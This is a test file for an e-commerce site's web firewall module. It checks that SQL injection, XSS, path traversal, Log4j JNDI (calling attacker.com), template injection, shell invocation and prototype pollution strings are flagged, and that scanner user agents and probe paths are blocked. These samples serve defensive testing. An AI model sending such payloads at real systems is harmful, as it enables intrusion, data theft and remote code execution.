import { SecurityGuardrails } from '@/lib/guardrails';

describe('Advanced Enterprise WAF & Security Hardening Suite', () => {
  describe('1. SQL Injection (SQLi) Defense', () => {
    it('blocks classic UNION SELECT payloads', () => {
      const payload1 = "' UNION SELECT null, username, password FROM users--";
      const res = SecurityGuardrails.detectMaliciousPayload(payload1);
      expect(res.isMalicious).toBe(true);
      expect(res.reason).toBe('SQL_INJECTION_DETECTED');
    });

    it('blocks URL-encoded SQLi bypass attempts', () => {
      const payload = "%27%20UNION%20ALL%20SELECT%201%2C2%2C3--";
      const res = SecurityGuardrails.detectMaliciousPayload(payload);
      expect(res.isMalicious).toBe(true);
      expect(res.reason).toBe('SQL_INJECTION_DETECTED');
    });

    it('blocks time-based blind SQLi (sleep / waitfor delay / pg_sleep)', () => {
      expect(SecurityGuardrails.detectMaliciousPayload("1; WAITFOR DELAY '0:0:5'--").isMalicious).toBe(true);
      expect(SecurityGuardrails.detectMaliciousPayload("1; SELECT pg_sleep(5)--").isMalicious).toBe(true);
      expect(SecurityGuardrails.detectMaliciousPayload("1 AND sleep(5)--").isMalicious).toBe(true);
    });

    it('blocks schema discovery and table drop attempts', () => {
      expect(SecurityGuardrails.detectMaliciousPayload("SELECT * FROM information_schema.tables").isMalicious).toBe(true);
      expect(SecurityGuardrails.detectMaliciousPayload("; DROP TABLE users;--").isMalicious).toBe(true);
    });
  });

  describe('2. Cross-Site Scripting (XSS) Defense', () => {
    it('blocks <script> tags', () => {
      const payload = "<script>alert('XSS')</script>";
      const res = SecurityGuardrails.detectMaliciousPayload(payload);
      expect(res.isMalicious).toBe(true);
      expect(res.reason).toBe('XSS_PAYLOAD_DETECTED');
    });

    it('blocks javascript: URI schemes', () => {
      const payload = "javascript:alert(document.cookie)";
      const res = SecurityGuardrails.detectMaliciousPayload(payload);
      expect(res.isMalicious).toBe(true);
      expect(res.reason).toBe('XSS_PAYLOAD_DETECTED');
    });

    it('blocks malicious event handlers (onerror, onload, onclick)', () => {
      const payload = '<img src="invalid" onerror="alert(1)">';
      const res = SecurityGuardrails.detectMaliciousPayload(payload);
      expect(res.isMalicious).toBe(true);
      expect(res.reason).toBe('XSS_PAYLOAD_DETECTED');
    });

    it('blocks iframe and object embeds', () => {
      expect(SecurityGuardrails.detectMaliciousPayload("<iframe src='evil.com'>").isMalicious).toBe(true);
      expect(SecurityGuardrails.detectMaliciousPayload("<object data='evil.swf'>").isMalicious).toBe(true);
    });
  });

  describe('3. Path Traversal & LFI / RFI Defense', () => {
    it('blocks classic ../ and ..\\ directory traversals', () => {
      expect(SecurityGuardrails.detectMaliciousPayload("../../etc/passwd").isMalicious).toBe(true);
      expect(SecurityGuardrails.detectMaliciousPayload("..\\..\\windows\\system32").isMalicious).toBe(true);
    });

    it('blocks URL-encoded directory traversal (%2e%2e%2f)', () => {
      const payload = "%2e%2e%2f%2e%2e%2fetc%2fpasswd";
      const res = SecurityGuardrails.detectMaliciousPayload(payload);
      expect(res.isMalicious).toBe(true);
      expect(res.reason).toBe('PATH_TRAVERSAL_DETECTED');
    });

    it('blocks sensitive OS file reads (/etc/passwd, /proc/self/environ)', () => {
      expect(SecurityGuardrails.detectMaliciousPayload("/etc/passwd").isMalicious).toBe(true);
      expect(SecurityGuardrails.detectMaliciousPayload("/proc/self/environ").isMalicious).toBe(true);
    });
  });

  describe('4. Remote Code Execution (RCE) & Prototype Pollution Defense', () => {
    it('blocks Log4j JNDI injection attempts', () => {
      const payload = "${jndi:ldap://attacker.com/a}";
      const res = SecurityGuardrails.detectMaliciousPayload(payload);
      expect(res.isMalicious).toBe(true);
      expect(res.reason).toBe('RCE_OR_TEMPLATE_INJECTION_DETECTED');
    });

    it('blocks server-side template injection (SSTI)', () => {
      const payload = "{{7*7}}";
      const res = SecurityGuardrails.detectMaliciousPayload(payload);
      expect(res.isMalicious).toBe(true);
      expect(res.reason).toBe('RCE_OR_TEMPLATE_INJECTION_DETECTED');
    });

    it('blocks shell command invocation (powershell, /bin/sh)', () => {
      expect(SecurityGuardrails.detectMaliciousPayload("; powershell.exe -c calc").isMalicious).toBe(true);
      expect(SecurityGuardrails.detectMaliciousPayload("&& /bin/sh -c id").isMalicious).toBe(true);
    });

    it('blocks prototype pollution payload attempts', () => {
      const payload = '{"__proto__": {"isAdmin": true}}';
      const res = SecurityGuardrails.detectMaliciousPayload(payload);
      expect(res.isMalicious).toBe(true);
      expect(res.reason).toBe('PROTOTYPE_POLLUTION_DETECTED');
    });
  });

  describe('5. Scanner & Probe Reconnaissance Firewall', () => {
    it('blocks known automated vulnerability scanner User-Agents', () => {
      const scanners = ['sqlmap/1.5#stable', 'Nikto/2.1.6', 'acunetix-wvs', 'masscan/1.0', 'zgrab', 'dirbuster'];
      for (const ua of scanners) {
        const res = SecurityGuardrails.detectProbingOrScanner('/search', ua);
        expect(res.isBlocked).toBe(true);
        expect(res.reason).toBe('MALICIOUS_SCANNER_USER_AGENT');
      }
    });

    it('blocks reconnaissance probes to sensitive files (.env, .git, wp-login.php)', () => {
      const probePaths = ['/.env', '/.env.local', '/.git/config', '/wp-admin', '/wp-login.php', '/phpmyadmin', '/xmlrpc.php', '/actuator/health'];
      for (const p of probePaths) {
        const res = SecurityGuardrails.detectProbingOrScanner(p, 'Mozilla/5.0');
        expect(res.isBlocked).toBe(true);
        expect(res.reason).toBe('SUSPICIOUS_PROBE_PATH');
      }
    });

    it('permits legitimate customer User-Agents and normal storefront routes', () => {
      const legitimateUa = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
      expect(SecurityGuardrails.detectProbingOrScanner('/', legitimateUa).isBlocked).toBe(false);
      expect(SecurityGuardrails.detectProbingOrScanner('/products/emerald-sofa', legitimateUa).isBlocked).toBe(false);
      expect(SecurityGuardrails.detectProbingOrScanner('/cart', legitimateUa).isBlocked).toBe(false);
      expect(SecurityGuardrails.detectProbingOrScanner('/checkout', legitimateUa).isBlocked).toBe(false);
    });
  });

  describe('6. Zero False Positives for Legitimate Customer Queries', () => {
    it('allows normal Urdu and English customer search terms', () => {
      const cleanQueries = [
        'Velvet Sofa',
        'Royal Bed Set',
        'Dining Table 6 chairs',
        'White marble coffee table',
        'category=living-room&sort=price_asc&page=1',
        'q=classic+wooden+armchair',
        'coupon=EID2026',
      ];
      for (const query of cleanQueries) {
        const res = SecurityGuardrails.detectMaliciousPayload(query);
        expect(res.isMalicious).toBe(false);
      }
    });
  });
});
